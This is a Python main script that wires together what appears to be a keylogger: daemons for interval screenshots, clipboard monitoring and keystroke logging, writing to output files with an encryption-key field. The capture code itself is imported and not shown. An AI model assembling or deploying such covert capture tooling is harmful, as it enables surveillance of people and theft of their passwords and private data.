from typing import List
from src.domain.config import Config
from src.domain.system_daemon import System_Daemon
from src.applications.common.logger_handler import Logger
from src.main import Main

# Daemons
from src.applications.daemons.screenshots_interval import Screenshots_Interval
from src.applications.daemons.clipboar_observer import Clipboard_Observer
from src.applications.daemons.keyboard_observer import Keyboard_Observer


if __name__ == "__main__":
    config: Config = {
        "FILE_PATH": "./output",
        "EXTEND": "/",  # on windows use "\\",
        "ENCRYPT_KEY": "",
        "SYSTEM_INFORMATION": "syseminfo.txt",
        "CLIPBOARD_INFORMATION": "clipboard.txt",
        "AUDIO_INFORMATION": "audio.wav",
        "SCREENSHOT_INTERVAL": 1,
        "SCREENSHOT_INFORMATION": "screenshot.png",
        "KEYS_INTERVAL": 1,
        "KEYS_INFORMATION": "key_log.txt",
    }

    logger = Logger("Main")

    daemons: List[System_Daemon] = [
        Screenshots_Interval(
            config,
            logger=Logger("Screenshot_Interval"),
            number_of_iterations=0,
            number_of_iterations_end=3,
        ),
        Clipboard_Observer(
            config,
            logger=Logger("Clipboard_Observer"),
            poll_interval=1,
        ),
        Keyboard_Observer(
            config,
            logger=Logger("Keys_Observer"),
            idle_time_limit=5.0,
        ),
    ]

    Main(config, logger, daemons)


"""
"AUDIO_INFORMATION_E": "e_audio.wav",
"SYSTEM_INFORMATION_E": "e_systeminfo.txt",
"CLIPBOARD_INFORMATION_E": "e_clipboard.txt",
"SCREENSHOT_INFORMATION_E": "e_screenshot.png",
"KEYS_INFORMATION_E": "e_key_log.txt",
"""
